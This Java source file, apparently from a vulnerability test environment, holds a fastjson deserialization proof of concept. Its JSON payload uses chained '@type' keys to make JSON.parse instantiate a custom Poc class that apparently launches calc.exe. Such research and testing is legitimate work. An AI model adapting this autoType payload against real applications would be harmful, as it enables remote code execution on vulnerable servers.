package person.xu.vulEnv;

import com.alibaba.fastjson.JSON;

public class Main {
    final static String POC = "{\"@type\":\"java.lang.Exception\",\"@type\":\"person.xu.vulEnv.Poc\",\"name\":\"calc.exe\"}";

    public static void main(String args[]) {
        JSON.parse(POC);
    }
}

